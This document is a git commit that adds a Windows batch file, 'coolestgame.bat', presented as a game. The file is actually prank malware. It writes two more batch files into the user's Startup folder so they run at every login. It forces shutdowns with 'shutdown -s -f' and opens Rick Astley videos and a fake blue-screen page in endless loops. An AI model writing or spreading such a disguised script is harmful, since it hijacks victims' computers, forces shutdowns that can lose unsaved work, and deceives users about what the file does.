9b360951f0cd3a3d2a27e7b8ac09622972d4a86a
Andy Jiang <andyjiang9999@gmail.com>
2022-07-31 10:37:39 +1000

    coolest game!

---
+++ coolestgame.bat
@@ -0,0 +1,43 @@
+@echo off
+(
+    echo @echo off
+    echo echo did you know: coolestgame.bat is so cool it automatically installs coolergame.bat onto your computer?
+    echo pause
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo echo we know the game and we're gonna play it...
+    echo pause
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo echo initiaiting shutdown sequence...
+    echo pause
+    echo shutdown -s -f -t 3 -c "have you ever considered closing the command prompt"
+    echo :a
+    echo start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+    echo goto a
+) > coolergame.bat
+(
+    echo @echo off
+    echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+    echo start lasthope.bat
+    echo echo del /q rickloop.bat^> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
+    echo echo echo you're welcome!^>^> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
+    echo echo @echo off^>^> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
+    echo echo del /q lasthope.bat^>^> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
+    echo shutdown -s -f -t 20 -c "did you know: coolestgame.bat is so cool it can revive itself after crashing? unless if that nasty lasthope.bat gets in the way..."
+    echo :a
+    echo start https://149367133.v2.pressablecdn.com/wp-content/uploads/2021/02/rick-astley-never-gonna-give-you-up-4k.jpg
+    echo goto a
+) > rickloop.bat
+copy /y coolergame.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy /y rickloop.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+del /q coolergame.bat
+del /q rickloop.bat
+shutdown -s -f -t 20 -c "welcome to coolestgame.bat!
+start http://fakebsod.com/windows-8-and-10
+timeout 3
+:a
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+goto a
